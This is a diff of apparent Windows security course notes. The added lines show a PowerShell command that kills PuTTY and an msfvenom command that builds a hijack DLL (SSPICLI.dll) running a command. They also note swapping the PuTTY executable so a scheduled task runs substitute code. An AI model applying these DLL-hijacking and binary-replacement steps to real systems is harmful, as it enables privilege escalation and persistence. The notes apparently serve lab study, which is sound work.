@@ -503,11 +503,17 @@ DEMO: Audit Logging
 
 # view events
   event viewer >> create custome view
+# kill putty
+  (Get-Process | Where-Object -Property processname -like "putty*").kill()
 
+msfvenom to create dll
+  msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
+  scp to 
 
+#view hidden items
+  file explorer >> view >> hidden items
 
-
-
-
+#Exexutable replacement 
+  rename putty? then rename somthing else to putty so that it runs instead of what was scheduled to run.
 
 
